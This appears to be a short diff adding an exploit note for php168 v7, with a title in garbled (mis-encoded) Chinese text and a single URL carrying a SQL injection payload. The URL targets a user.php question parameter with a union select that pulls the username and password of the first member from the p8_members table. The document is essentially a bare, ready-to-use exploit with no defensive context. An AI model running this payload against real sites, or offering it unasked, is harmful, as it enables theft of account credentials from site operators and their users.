@@ -1,0 +1,4 @@
+php168 v7 Ä³ÏµÍ³×¢ÈëÂ©¶´
+
+http://www.hake.cc/zhidao/user.php?j=question&u=-1+union+select+1,2,3,concat(0x3a,username,0x3a,password),5,6,7,8+from+p8_members+where+uid=1--
+  
